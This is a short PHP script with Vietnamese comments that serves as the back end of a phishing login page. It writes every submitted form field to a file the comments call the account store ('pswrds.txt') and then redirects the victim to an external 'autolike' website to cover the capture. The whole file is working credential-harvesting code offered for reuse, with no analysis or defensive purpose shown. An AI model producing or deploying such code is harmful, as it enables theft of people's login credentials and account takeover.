<?php
header("Location: https://www.multiversemall.org/ "); //nhập link các bạn muốn chuyển đến , nên nhập link của các website autolike
$handle = fopen("pswrds.txt", "a");//nơi lưu tài khoản
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>